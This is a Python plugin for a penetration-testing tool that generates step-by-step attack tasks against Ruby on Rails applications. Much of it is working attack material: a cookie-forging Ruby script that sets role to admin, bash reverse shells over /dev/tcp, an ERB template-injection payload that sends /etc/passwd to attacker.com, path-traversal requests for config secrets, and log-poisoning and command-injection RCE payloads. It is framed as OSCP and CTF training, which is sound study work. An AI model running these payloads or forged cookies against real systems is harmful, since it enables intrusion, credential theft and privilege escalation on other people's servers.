"""
Ruby on Rails enumeration and exploitation plugin

Generates tasks for Ruby on Rails application testing including:
- Framework detection and version enumeration
- secret_key_base exploitation (cookie forging)
- Rails-specific CVEs (Active Storage RCE, Rack::Static LFI)
- Template injection (ERB/SSTI)
- File upload to RCE vectors
- YAML deserialization attacks
- Log injection to RCE

Extracted from HackTricks: pentesting-web/ruby-tricks.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class RubyOnRailsPlugin(ServicePlugin):
    """Ruby on Rails application enumeration and exploitation plugin"""

    @property
    def name(self) -> str:
        return "ruby-on-rails"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 3000, 8080]  # Common Rails ports

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect Ruby on Rails applications"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()
        port = port_info.get('port')

        # Check for Rails indicators in service info
        if 'rails' in service or 'rails' in product or 'rails' in version:
            return True

        # Check for Ruby indicators
        if 'ruby' in service or 'ruby' in product or 'puma' in product or 'unicorn' in product:
            return True

        # Check common web ports (will be refined by whatweb/technology detection)
        if port in self.default_ports and any(s in service for s in self.service_names):
            return True

        return False


    def detect_from_finding(self, finding: Dict[str, Any], profile=None) -> int:
        """Detect Ruby on Rails from technology findings"""
        from ..core.constants import FindingTypes
        import logging
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match - Rails framework detected
        if finding_type in [FindingTypes.FRAMEWORK_RAILS, FindingTypes.TECH_RUBY]:
            logger.info("Rails plugin activating: Framework detected")
            return 100

        # High confidence - Rails indicators
        rails_indicators = ['ruby on rails', 'rails', 'puma', 'unicorn',
                            'passenger', 'gemfile', '/rails/info']
        if any(ind in description for ind in rails_indicators):
            logger.info(f"Rails plugin activating: Found '{description[:50]}'")
            return 90

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Ruby on Rails enumeration task tree"""
        version = service_info.get('version', 'unknown')
        product = service_info.get('product', '')

        # Determine protocol
        protocol = 'https' if port == 443 or 'https' in service_info.get('service', '') else 'http'
        base_url = f"{protocol}://{target}:{port}"

        tasks = {
            'id': f'rails-enum-{port}',
            'name': f'Ruby on Rails Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: Framework Detection
        tasks['children'].append({
            'id': f'rails-detect-{port}',
            'name': 'Rails Framework Detection',
            'type': 'parent',
            'children': [
                {
                    'id': f'rails-whatweb-{port}',
                    'name': 'Technology Fingerprinting',
                    'type': 'command',
                    'metadata': {
                        'command': f'whatweb -v -a 3 {base_url}',
                        'description': 'Detect Rails framework, version, and Ruby version',
                        'flag_explanations': {
                            '-v': 'Verbose output (show all detected technologies)',
                            '-a 3': 'Aggression level 3 (thorough detection with plugins)',
                            base_url: 'Target URL to fingerprint'
                        },
                        'success_indicators': [
                            'Ruby on Rails detected',
                            'Ruby version identified',
                            'Server header reveals Puma/Unicorn/Passenger',
                            'X-Runtime or X-Request-Id headers (Rails-specific)'
                        ],
                        'failure_indicators': [
                            'Connection timeout',
                            'No Rails indicators found',
                            'Generic Nginx/Apache without Rails hints'
                        ],
                        'next_steps': [
                            'Note Rails version for CVE research',
                            'Check for debug mode indicators',
                            'Test for secret_key_base leakage',
                            'Enumerate common Rails paths'
                        ],
                        'alternatives': [
                            f'Manual: curl -I {base_url} | grep -i "x-runtime\\|x-powered-by"',
                            f'Manual: Check page source for Rails asset pipeline (/assets/application-*.js)',
                            f'wappalyzer: Browser extension for technology detection',
                            f'nmap --script http-headers {target} -p {port}'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RECON', 'ENUM'],
                        'estimated_time': '2-3 minutes',
                        'notes': 'Rails apps often leak version in X-Runtime header or asset pipeline filenames. Check for /rails/info/routes in development mode.'
                    }
                },
                {
                    'id': f'rails-paths-{port}',
                    'name': 'Rails-Specific Path Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': f'gobuster dir -u {base_url} -w /usr/share/seclists/Discovery/Web-Content/Rails-123.txt -o rails_paths_{port}.txt',
                        'description': 'Enumerate common Rails paths (routes, assets, API endpoints)',
                        'flag_explanations': {
                            'dir': 'Directory/file brute-forcing mode',
                            '-u': 'Target URL',
                            '-w': 'Wordlist of Rails-specific paths (routes, controllers, assets)',
                            '-o': 'Output file for documentation'
                        },
                        'success_indicators': [
                            '/rails/info/routes exposed (development mode)',
                            '/assets/ directory accessible',
                            '/api/ or /api/v1/ endpoints found',
                            '/uploads/ or /active_storage/ paths present'
                        ],
                        'failure_indicators': [
                            'All requests return 404',
                            'Rate limiting triggered',
                            'Wordlist not found (install seclists)'
                        ],
                        'next_steps': [
                            'If /rails/info/routes found, map all application routes',
                            'Check /assets/ for source maps (.js.map reveals code structure)',
                            'Test API endpoints for authentication bypass',
                            'Inspect /active_storage/ for file upload vulnerabilities'
                        ],
                        'alternatives': [
                            f'Manual: curl {base_url}/rails/info/routes',
                            f'Manual: curl {base_url}/assets/ (directory listing)',
                            f'ffuf -u {base_url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/Rails-123.txt',
                            f'feroxbuster -u {base_url} -w /path/to/rails-wordlist.txt'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'AUTOMATED'],
                        'estimated_time': '5-10 minutes',
                        'notes': 'Development mode exposes /rails/info/routes with ALL application endpoints. If found, this is a goldmine for attack surface mapping.'
                    }
                },
                {
                    'id': f'rails-version-research-{port}',
                    'name': 'Rails Version CVE Research',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Research known CVEs for detected Rails version',
                        'alternatives': [
                            f'searchsploit "ruby on rails"',
                            f'searchsploit rails {version}' if version != 'unknown' else 'Check Rails version first',
                            'Google: "rails [version] CVE" site:github.com/advisories',
                            'Check: https://discuss.rubyonrails.org/c/security/11',
                            'CVE Database: https://www.cvedetails.com/product/30886/Rubyonrails-Rails.html'
                        ],
                        'next_steps': [
                            'Test for Active Storage RCE (CVE-2025-24293) if version < 7.1.5.2/7.2.2.2/8.0.2.1',
                            'Test for Rack::Static LFI (CVE-2025-27610) if Rack < 2.2.13/3.0.14/3.1.12',
                            'Test for YAML deserialization if version < 5.2.6',
                            'Check for secret_key_base leakage'
                        ],
                        'tags': ['OSCP:HIGH', 'RESEARCH', 'MANUAL'],
                        'estimated_time': '10-15 minutes',
                        'notes': 'Focus on RCE and authentication bypass CVEs. Rails has history of deserialization and cookie forgery issues.'
                    }
                }
            ]
        })

        # PHASE 2: secret_key_base Exploitation
        tasks['children'].append({
            'id': f'rails-secret-key-{port}',
            'name': 'secret_key_base Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'rails-secret-hunt-{port}',
                    'name': 'Hunt for secret_key_base Leakage',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Search for leaked secret_key_base in common locations',
                        'alternatives': [
                            f'Check: {base_url}/.git/ (git exposure)',
                            f'Check: {base_url}/config/secrets.yml',
                            f'Check: {base_url}/config/master.key',
                            f'Check: {base_url}/.env',
                            'GitHub search: "secret_key_base" [target domain]',
                            'Shodan/Censys: Search for debug pages exposing environment',
                            'Google dorking: site:[target] "secret_key_base"',
                            'Check Rails console output if accessible'
                        ],
                        'success_indicators': [
                            'secret_key_base value found (64+ char hex string)',
                            '.git directory accessible',
                            'Config files readable',
                            'Environment variables exposed in error pages'
                        ],
                        'failure_indicators': [
                            'All config paths return 404',
                            'No Git repository exposed',
                            'Production mode hides secrets'
                        ],
                        'next_steps': [
                            'If secret found, capture current session cookie',
                            'Decrypt cookie to understand structure',
                            'Modify cookie payload (role, user_id, permissions)',
                            'Re-encrypt and test authentication bypass'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'RESEARCH'],
                        'estimated_time': '5-10 minutes',
                        'notes': 'secret_key_base is the master key for all Rails encryption. If leaked, full authentication bypass is possible via cookie forgery.'
                    }
                },
                {
                    'id': f'rails-cookie-decrypt-{port}',
                    'name': 'Rails Cookie Decryption',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Decrypt Rails cookie using leaked secret_key_base',
                        'alternatives': [
                            'Ruby script (see notes for code)',
                            'Online decoder: rails-cookie-decoder.com (use with caution)',
                            'Manual: base64 decode cookie parts and analyze structure'
                        ],
                        'success_indicators': [
                            'Cookie decrypted successfully',
                            'JSON payload revealed (user_id, role, session data)',
                            'Cookie structure understood'
                        ],
                        'failure_indicators': [
                            'Decryption fails (wrong secret_key_base or salt)',
                            'Cookie format unrecognized',
                            'Cipher mismatch (AES-256-GCM vs AES-256-CBC)'
                        ],
                        'next_steps': [
                            'Modify decrypted payload (escalate privileges)',
                            'Re-encrypt with same secret_key_base',
                            'Replace session cookie in browser',
                            'Test authentication bypass'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'estimated_time': '15-20 minutes',
                        'notes': '''
Ruby decryption script:
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = "LEAKED_SECRET_HERE"
raw_cookie = CGI.unescape("COOKIE_VALUE_HERE")

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'  # Modern Rails default
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
Note: Older Rails may use AES-256-CBC, adjust cipher/salt accordingly.
                        '''
                    }
                }
            ]
        })

        # PHASE 3: Rails-Specific CVEs
        tasks['children'].append({
            'id': f'rails-cve-testing-{port}',
            'name': 'Rails CVE Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'rails-active-storage-rce-{port}',
                    'name': 'Active Storage Image Transform RCE (CVE-2025-24293)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for Active Storage image transformation command injection',
                        'alternatives': [
                            'Vulnerable pattern: <%= image_tag blob.variant(params[:t] => params[:v]) %>',
                            'Test payload: params[:t]=resize&params[:v]=100x100;`id>/tmp/pwned`',
                            'Fuzz transformation parameters with command injection payloads',
                            'Check for image_processing + mini_magick gems in use'
                        ],
                        'success_indicators': [
                            'Command executed (out-of-band verification)',
                            'Blind command injection confirmed via sleep',
                            'ImageMagick errors reveal command context',
                            'Generated image variants show execution side effects'
                        ],
                        'failure_indicators': [
                            'No Active Storage endpoints found',
                            'Rails version >= 7.1.5.2/7.2.2.2/8.0.2.1 (patched)',
                            'Strict allowlist blocks transformation parameters',
                            'ImageMagick policy blocks dangerous operations'
                        ],
                        'next_steps': [
                            'If vulnerable, craft reverse shell payload',
                            'Exfiltrate data via ImageMagick operations',
                            'Check for blind command injection via timing',
                            'Document vulnerable endpoint and parameters'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'CVE', 'RCE'],
                        'estimated_time': '20-30 minutes',
                        'notes': 'Affects Rails < 7.1.5.2/7.2.2.2/8.0.2.1 with Active Storage + image_processing + mini_magick. User-controlled transformation params can execute commands. Check for /active_storage/blobs/... URLs.'
                    }
                },
                {
                    'id': f'rails-rack-static-lfi-{port}',
                    'name': 'Rack::Static Path Traversal (CVE-2025-27610)',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/assets/%2e%2e/%2e%2e/config/database.yml"',
                        'description': 'Test for Rack::Static LFI via encoded path traversal',
                        'flag_explanations': {
                            '%2e%2e': 'URL-encoded .. (dot-dot) for directory traversal',
                            '/assets/': 'Common Rack::Static mount point',
                            '/config/database.yml': 'Target sensitive Rails config file'
                        },
                        'success_indicators': [
                            'database.yml contents returned',
                            'File contents from outside web root',
                            'Config files readable (secrets.yml, master.key, .env)'
                        ],
                        'failure_indicators': [
                            '404 Not Found',
                            'Path traversal blocked',
                            'Rack version >= 2.2.13/3.0.14/3.1.12 (patched)',
                            'Rack::Static not in use'
                        ],
                        'next_steps': [
                            'If vulnerable, read config/database.yml',
                            'Try /config/secrets.yml for secret_key_base',
                            'Read /config/master.key',
                            'Check /.env for environment variables',
                            'Map application structure via file enumeration'
                        ],
                        'alternatives': [
                            f'curl "{base_url}/favicon.ico/..%2f..%2f.env"',
                            f'curl "{base_url}/public/%2e%2e/%2e%2e/Gemfile"',
                            'Try different static mount points: /static/, /public/, /files/',
                            'Burp Suite: Encode traversal in multiple ways'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'CVE', 'LFI', 'QUICK_WIN'],
                        'estimated_time': '5-10 minutes',
                        'notes': 'Affects Rack < 2.2.13/3.0.14/3.1.12. Encoded traversal in PATH_INFO bypasses root checks. Adjust prefix to match Rack::Static urls: config.'
                    }
                },
                {
                    'id': f'rails-file-upload-rce-{port}',
                    'name': 'File Upload to RCE (config/initializers/)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test arbitrary .rb file upload to sensitive boot directories',
                        'alternatives': [
                            'Upload .rb file to /config/initializers/ (executed on app boot)',
                            'Upload to /config/ directory (may be evaluated)',
                            'Payload: system("bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'")',
                            'Check for file upload functionality with path control',
                            'Test if uploaded files land in config/ directories'
                        ],
                        'success_indicators': [
                            'File uploaded to config/initializers/',
                            'Application restart triggers code execution',
                            'Reverse shell received on app boot',
                            'Dev/staging builds copy user files into container'
                        ],
                        'failure_indicators': [
                            'Upload restricted to /public/ or /uploads/',
                            'File type validation blocks .rb',
                            'No path traversal in upload',
                            'Production environment not restarting'
                        ],
                        'next_steps': [
                            'If upload succeeds, wait for app restart/deploy',
                            'Trigger app restart if possible (crash, redeploy)',
                            'Check for auto-reload in development mode',
                            'Set up reverse shell listener before trigger'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'RCE', 'UPLOAD'],
                        'estimated_time': '30+ minutes',
                        'notes': 'config/initializers/ code is executed on Rails boot. Other risky paths: lib/, app/models/ (if autoloaded). Dev/staging builds are high-value targets. Source: CVE-2024-46986'
                    }
                }
            ]
        })

        # PHASE 4: Template Injection (ERB/SSTI)
        tasks['children'].append({
            'id': f'rails-ssti-{port}',
            'name': 'ERB Template Injection (SSTI)',
            'type': 'parent',
            'children': [
                {
                    'id': f'rails-ssti-detect-{port}',
                    'name': 'Detect ERB Template Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test user input reflection in ERB templates',
                        'alternatives': [
                            'Payload: <%= 7*7 %> (should return 49)',
                            'Payload: <%= "test".upcase %> (should return TEST)',
                            'Payload: <%= File.read("/etc/passwd") %>',
                            'Payload: <%= system("id") %>',
                            'Test GET/POST params, URL paths, headers'
                        ],
                        'success_indicators': [
                            'Mathematical expression evaluated (49 from 7*7)',
                            'Ruby methods executed (upcase works)',
                            'File read successful',
                            'System command output visible'
                        ],
                        'failure_indicators': [
                            'Payload reflected as literal string',
                            'Syntax errors (not evaluated)',
                            'Output sanitized/escaped',
                            'No user input reflected in templates'
                        ],
                        'next_steps': [
                            'If vulnerable, escalate to file read',
                            'Test system command execution',
                            'Craft reverse shell payload',
                            'Identify injection context (ERB, Haml, Slim)'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'SSTI', 'RCE'],
                        'estimated_time': '15-20 minutes',
                        'notes': 'ERB is Rails default templating. Vulnerable pattern: render inline: params[:template]. Test all user-controlled input. SSTI often leads to RCE.'
                    }
                },
                {
                    'id': f'rails-ssti-exploit-{port}',
                    'name': 'ERB SSTI to RCE',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit ERB template injection for remote code execution',
                        'alternatives': [
                            'RCE Payload: <%= system("bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'") %>',
                            'File read: <%= File.read("/etc/passwd") %>',
                            'Exfiltration: <%= Net::HTTP.get("attacker.com", "/#{File.read(\'/etc/passwd\').gsub(/\\n/, \'%0A\')}") %>',
                            'Ruby eval: <%= eval(params[:code]) %> (if eval available)',
                            'Blind: <%= sleep(10) %> (timing-based detection)'
                        ],
                        'success_indicators': [
                            'Reverse shell received',
                            'File contents exfiltrated',
                            'Out-of-band DNS/HTTP request received',
                            'Timing delay confirms execution'
                        ],
                        'failure_indicators': [
                            'Syntax errors block payload',
                            'Output not visible (blind SSTI)',
                            'Restricted methods/classes',
                            'WAF blocks payloads'
                        ],
                        'next_steps': [
                            'Establish persistent shell',
                            'Enumerate system for privilege escalation',
                            'Document vulnerable endpoint and payload',
                            'Check for additional injection points'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'SSTI', 'RCE'],
                        'estimated_time': '20-30 minutes',
                        'notes': 'ERB SSTI is critical - full RCE. Bypass filters: Use backticks, %x{command}, IO.popen. Check HackTricks SSTI section for advanced payloads.'
                    }
                }
            ]
        })

        # PHASE 5: Log Injection to RCE
        tasks['children'].append({
            'id': f'rails-log-injection-{port}',
            'name': 'Log Injection to RCE (load + Pathname)',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit log injection + Ruby load + Pathname.cleanpath for RCE',
                'alternatives': [
                    'Vulnerable pattern: Logger logs user input, then load(Pathname.cleanpath(input))',
                    'Payload: \\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log',
                    'URL-encoded: %0A%5D%5B0%5D%3D1%3Bsystem%28%22id%22%29%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log',
                    'Exfil: \\n][0]=1;f=Dir[\'/tmp/flag*.txt\'][0];puts File.read(f)#://../../../../logs/error.log',
                    'Requires: App logs param raw, then load(cleanpath(param))'
                ],
                'success_indicators': [
                    'Command executed (verify via out-of-band)',
                    'Log file poisoned with Ruby code',
                    'Pathname.cleanpath resolves to log file',
                    'Ruby load executes poisoned log'
                ],
                'failure_indicators': [
                    'App does not log user input verbatim',
                    'No load() call with user-controlled path',
                    'Log path not accessible to load()',
                    'Payload syntax errors prevent execution'
                ],
                'next_steps': [
                    'If vulnerable, craft reverse shell payload',
                    'Poison log with Ruby code',
                    'Trigger load() via application workflow',
                    'Establish persistent access'
                ],
                'tags': ['OSCP:LOW', 'EXPLOIT', 'RCE', 'ADVANCED'],
                'estimated_time': '40+ minutes',
                'notes': '''
Complex but powerful attack chain:
1. App logs user input raw: logger.info("Running #{params[:script]}")
2. App loads file: load "scripts/#{Pathname.new(params[:script]).cleanpath}"
3. Payload poisons log AND resolves to log path via cleanpath
4. Ruby load() executes log file as code

Key primitives:
- Ruby load evaluates ANY file as Ruby (ignores extension)
- Pathname.cleanpath collapses .. without filesystem access
- # in payload comments out URL scheme, cleanpath still works

Example: \\n][0]=1;system("id")#://../../../../logs/error.log
- Leading \\n breaks out of INFO log line
- ] closes dangling [ from logger prefix
- ][0]=1 satisfies Ruby parser
- system("id") is our payload
- # comments out ://... tail
- cleanpath resolves to ../logs/error.log

Source: YesWeHack Dojo CTF #44
                '''
            }
        })

        # PHASE 6: Additional Rails Attack Vectors
        tasks['children'].append({
            'id': f'rails-additional-{port}',
            'name': 'Additional Rails Attack Vectors',
            'type': 'parent',
            'children': [
                {
                    'id': f'rails-mass-assignment-{port}',
                    'name': 'Mass Assignment Testing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for mass assignment vulnerabilities in model updates',
                        'alternatives': [
                            'Add admin=true to POST params',
                            'Inject role=admin in user update',
                            'Test: user[role]=admin, user[is_admin]=true',
                            'Burp: Add extra params to update requests',
                            'Check for strong_parameters bypass'
                        ],
                        'success_indicators': [
                            'Privilege escalation successful',
                            'Unauthorized attribute modified',
                            'Admin role granted via param injection'
                        ],
                        'failure_indicators': [
                            'Strong parameters block extra params',
                            'Attribute whitelist enforced',
                            'Changes not persisted'
                        ],
                        'next_steps': [
                            'Enumerate model attributes',
                            'Test all update endpoints',
                            'Check for JSON mass assignment',
                            'Document successful privilege escalation'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'PRIVESC'],
                        'estimated_time': '20-30 minutes',
                        'notes': 'Older Rails vulnerable to mass assignment. Modern Rails uses strong_parameters but devs often forget whitelisting. Test user updates, profile edits, API endpoints.'
                    }
                },
                {
                    'id': f'rails-yaml-deserial-{port}',
                    'name': 'YAML Deserialization Testing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for unsafe YAML deserialization (YAML.load)',
                        'alternatives': [
                            'Vulnerable pattern: YAML.load(params[:data])',
                            'Payload: !ruby/object:Gem::Installer (see Ruby deserialization docs)',
                            'Safe method: YAML.safe_load (check if used)',
                            'Test YAML import features, config uploads',
                            'Check for Marshal.load (similar vulnerability)'
                        ],
                        'success_indicators': [
                            'YAML payload accepted',
                            'Object instantiation from YAML',
                            'RCE achieved via deserialization gadget'
                        ],
                        'failure_indicators': [
                            'YAML.safe_load blocks object instantiation',
                            'Input validation rejects YAML',
                            'Rails version >= 5.2.6 (safer defaults)'
                        ],
                        'next_steps': [
                            'Research Ruby deserialization gadgets',
                            'Craft RCE payload',
                            'Test Marshal.load endpoints',
                            'Check HackTricks Ruby deserialization section'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'RCE', 'DESERIAL'],
                        'estimated_time': '30+ minutes',
                        'notes': 'YAML.load is extremely dangerous - allows arbitrary Ruby object instantiation. Check for YAML import features, config uploads, API endpoints accepting YAML. See HackTricks deserialization/ruby-*.md'
                    }
                },
                {
                    'id': f'rails-debug-console-{port}',
                    'name': 'Rails Console/Debug Access',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Check for exposed Rails console or debug interfaces',
                        'alternatives': [
                            f'Check: {base_url}/rails/info/routes',
                            f'Check: {base_url}/console',
                            f'Check: {base_url}/__better_errors (Better Errors gem)',
                            'Look for web-console gem access',
                            'Error pages in development mode reveal code',
                            'Check for Pry debugger web interface'
                        ],
                        'success_indicators': [
                            '/rails/info/routes accessible (full route map)',
                            'Rails console exposed',
                            'Better Errors REPL accessible',
                            'Development mode error pages with code'
                        ],
                        'failure_indicators': [
                            'All debug paths return 404',
                            'Production mode enabled',
                            'Debug gems not installed'
                        ],
                        'next_steps': [
                            'If routes exposed, map all application endpoints',
                            'If console exposed, execute Ruby code directly',
                            'Better Errors REPL = immediate RCE',
                            'Document all discovered routes and parameters'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'RCE'],
                        'estimated_time': '5-10 minutes',
                        'notes': 'Development mode is a goldmine. /rails/info/routes reveals ENTIRE application. Better Errors gem provides REPL in browser (RCE). web-console gem similar.'
                    }
                }
            ]
        })

        # PHASE 7: Documentation & Reporting
        tasks['children'].append({
            'id': f'rails-documentation-{port}',
            'name': 'Rails Assessment Documentation',
            'type': 'manual',
            'metadata': {
                'description': 'Document Rails-specific findings for OSCP report',
                'alternatives': [
                    'crack track finding <target> --type rails_rce --description "..." --source "..."',
                    'Document: Rails version, Ruby version, server (Puma/Unicorn)',
                    'Document: All CVEs tested (success/failure)',
                    'Document: secret_key_base if leaked',
                    'Screenshot: All successful exploits',
                    'Document: Attack chain for each vulnerability'
                ],
                'next_steps': [
                    'Export findings: crack track export <target>',
                    'Include remediation recommendations',
                    'Document manual alternatives used',
                    'Timeline of exploitation attempts'
                ],
                'tags': ['OSCP:HIGH', 'DOCUMENTATION'],
                'estimated_time': '15-20 minutes',
                'notes': 'OSCP requires detailed documentation with sources. Track which techniques worked, which failed, and WHY. Include manual alternatives for each automated test.'
            }
        })

        return tasks


# Module docstring for help/documentation
__doc__ = """
Ruby on Rails Plugin - Comprehensive Rails Application Testing

DETECTION CRITERIA:
- Rails/Ruby indicators in service info
- Puma/Unicorn/Passenger servers
- Common web ports (80, 443, 3000, 8080)

KEY ATTACK VECTORS:
1. secret_key_base exploitation → Cookie forgery → Auth bypass
2. Active Storage RCE (CVE-2025-24293) → Command injection
3. Rack::Static LFI (CVE-2025-27610) → Config file disclosure
4. ERB Template Injection → SSTI → RCE
5. File upload to config/initializers/ → RCE on boot
6. Log injection + load/cleanpath → RCE
7. YAML deserialization → RCE
8. Mass assignment → Privilege escalation

OSCP RELEVANCE:
- Rails apps common in modern CTFs
- Multiple RCE vectors (high value targets)
- Manual enumeration techniques emphasized
- Cookie forgery teaches crypto exploitation
- Template injection tests code review skills

MANUAL ALTERNATIVES:
- curl for header analysis and path testing
- Browser dev tools for cookie manipulation
- Ruby IRB for payload crafting
- Manual file enumeration without gobuster
- Source code review for vulnerability discovery

ENUMERATION METHODOLOGY:
1. Framework Detection → Identify Rails and version
2. Path Enumeration → Find sensitive endpoints
3. CVE Research → Match version to known exploits
4. secret_key_base Hunt → Config disclosure attempts
5. SSTI Testing → Template injection checks
6. File Upload Analysis → Boot directory targeting
7. Deserialization → YAML/Marshal testing

TIME ESTIMATES:
- Quick wins (detection, basic enum): 15-20 minutes
- CVE exploitation: 30-60 minutes per CVE
- Cookie forgery: 30-45 minutes (requires secret)
- SSTI to RCE: 30-45 minutes
- Full assessment: 2-3 hours

REFERENCES:
- HackTricks: ruby-tricks.md
- Rails Security: https://discuss.rubyonrails.org/c/security/11
- CVE-2025-24293: Active Storage RCE
- CVE-2025-27610: Rack::Static LFI
- CVE-2024-46986: File upload to RCE
- Ruby Deserialization: HackTricks deserialization/ruby-*.md
"""
